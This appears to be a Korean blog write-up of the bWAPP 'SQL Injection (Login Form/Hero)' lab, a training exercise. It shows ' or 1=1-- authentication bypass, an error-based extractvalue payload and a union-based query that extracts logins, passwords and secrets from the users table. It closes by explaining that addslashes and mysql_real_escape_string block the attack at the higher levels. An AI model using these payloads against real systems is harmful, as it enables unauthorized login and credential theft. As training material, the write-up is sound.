---
layout: single
title: (bWAPP)SQL Injection (Login Form/Hero)
categories: bwapp
tag: [sql injection, sql, injection, bwapp, bee box, GET, OWASP TOP 10, OWASP]
toc: true
author_profile: false
---

# 검증 로직
> Low Level 에서는 보안 대책이 적용되어 있지 않다.

## Level - Low

![그림 1-1](/assets/image/bwapp/injection/sqli-hero-archive/sqli-hero/image.png)

- 일반적인 Login Form이 존재한다.
![그림 1-2](/assets/image/bwapp/injection/sqli-hero-archive/sqli-hero/image2.png)
- '(싱글 쿼터) 입력을 통한 DBMS Error 유/무 확인시 Error 발생

![그림 1-3](/assets/image/bwapp/injection/sqli-hero-archive/sqli-hero/image3.png)
- 일반적인 ' or 1=1-- 와 같은 인증 우회를 통해 로그인이 가능
- Neo 계정으로 로그인 성공
- 이를 통해 user 목록이 있는 테이블 최 상단에 Neo 유저가 있는 것으로 추정
- Limit 절을 사용하여 한명씩 로그인 하며 전부 확인이 가능함.

```sql
' or 1=1-- 
' or 1=1 limit 1,1-- 
' or 1=1 limit {idx},1--  
```

![그림 1-4](/assets/image/bwapp/injection/sqli-hero-archive/sqli-hero/image4.png)
- 이전 취약점 유/무 확인시 DBMS Error가 발생하였으며, Error Based 공격이 가능함

```sql
' AND extractvalue(0x0a,concat(@@version))
```

![그림 1-5](/assets/image/bwapp/injection/sqli-hero-archive/sqli-hero/image5.png)
![그림 1-6](/assets/image/bwapp/injection/sqli-hero-archive/sqli-hero/image6.png)

- 입력값에 대한 결과를 웹 페이지에 노출되고 있음
- Union-Based공격 또한 가능
- 4개의 컬럼이 사용중이며
- 2, 4 컬럼이 페이지에 노출되고 있음

```sql
1' union select 1,concat(id,0x3a,login),3,concat(password,0x3a,secret) from bWAPP.users limit 1,1--
```

- 출력되는 레코드는 하나의 열씩 출력 되므로, 순차적 레코드 출력으로 데이터를 추출해야함
![그림 1-7](/assets/image/bwapp/injection/sqli-hero-archive/sqli-hero/image7.png)
- 데이터 추출 성공

## Medium & High

```php
function sqli_check_1($data)
{
    return addslashes($data)
}

function sqli_check_2($data)
{
    return mysql_real_escape_string($data);
}
```

1. Medium Level 에서는 addslahes() 함수를 사용하여 ‘(싱글쿼터 )를 입력하게되면 \ 를 앞에 붙여 ‘(싱글쿼터) 사용을 막고 있다. 해당 search 구문인 ‘%%’ 로 이루어져 있어 공격이 성립되지 않는다.
2. High Level 에서는 mysql_real_escape_string() 함수를 사용하여 메타문자를 방지하고 있다.
3. 해당 문제에서 Medium 과 High Level은 공격이 성립되지 않는다.

